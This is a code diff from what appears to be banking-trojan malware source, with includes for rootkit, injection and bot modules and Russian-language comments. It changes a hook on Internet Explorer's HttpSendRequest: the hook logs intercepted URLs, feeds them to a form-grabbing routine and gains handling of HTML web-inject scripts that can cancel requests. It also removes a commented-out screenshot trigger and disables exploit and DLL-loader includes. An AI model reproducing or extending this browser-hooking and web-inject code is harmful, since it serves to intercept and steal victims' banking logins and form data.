@@ -3,12 +3,13 @@
 #include <urlmon.h>
 
 #include "InternetExplorer.h"
+#include "HTMLInjectsScriptAdapter.h"
 #include "GetApi.h"
 #include "Utils.h"
-#include "DllLoader.h"
+//#include "DllLoader.h"
 #include "Memory.h"
 #include "Strings.h"
-#include "Exploit.h"
+//#include "Exploit.h"
 #include "BotUtils.h"
 #include "Rootkit.h"
 #include "Inject.h"
@@ -17,7 +18,6 @@
 #include "Splice.h"
 #include "Loader.h"
 #include "Config.h"
-#include "Unhook.h"
 #include "ntdll.h"
 #include "Requests.h"
 #include "BotHTTP.h"
@@ -367,7 +367,7 @@ void WINAPI FORMGrabber(PRequest Request)
 
 
 PRequest HttpPreSendRequest(HINTERNET Handle, LPVOID Optional,
-	DWORD OptionalLength)
+	DWORD OptionalLength, bool &CancelRequest)
 {
 
 	// Обрабатываем запрос
@@ -395,6 +395,12 @@ PRequest HttpPreSendRequest(HINTERNET Handle, LPVOID Optional,
 	Request->Method = MID;
 
 	IEDBG(Request, NULL, "Перехватываем запрос на %s", Request->URL);
+
+
+	// Обрабатываем взаимодействие со скриптами инжектов
+	ProcessHTMLInjectRequest(Request->URL, &CancelRequest);
+	if (CancelRequest)
+		return Request;
 
 
 	#ifdef bsssignH
@@ -483,32 +489,23 @@ BOOL WINAPI HttpSendRequestHandler(BOOL bType, HINTERNET hRequest,
 			dwHeadersLength, HTTP_ADDREQ_FLAG_REPLACE | HTTP_ADDREQ_FLAG_ADD);
 	}
 
-	// проверяем на необходимость создания скриншота
-	// if ( dwOptionalLength )
-	// {
-	// char *Opt = (char*)lpOptional;
-	//
-	// Opt[ dwOptionalLength ] = '\0'; // Эта строка приводила к краху
-	//
-	// if ( CalcHash(Opt) == 0x24DE3210)
-	// {
-	// StartThread( ScreensThread, NULL );
-	// }
-	// }
-
 	// Обрабатываем запрос
-	HttpPreSendRequest(hRequest, lpOptional, dwOptionalLength);
+    bool CancelRequest = false;
+	HttpPreSendRequest(hRequest, lpOptional, dwOptionalLength, CancelRequest);
 
 	// Вызываем оригинальный метод запроса
 
-	BOOL ret = 0;
+	BOOL ret = -1;
 
-	if (bType)
-		ret = REAL_HttpSendRequestA(hRequest, NULL, dwHeadersLength,
-		lpOptional, dwOptionalLength);
-	else
-		ret = REAL_HttpSendRequestW(hRequest, NULL, 0, lpOptional,
-		dwOptionalLength);
+	if (!CancelRequest)
+	{
+		if (bType)
+			ret = REAL_HttpSendRequestA(hRequest, NULL, dwHeadersLength,
+										lpOptional, dwOptionalLength);
+		else
+			ret = REAL_HttpSendRequestW(hRequest, NULL, 0, lpOptional,
+										dwOptionalLength);
+	}
 
 	return ret;
 }
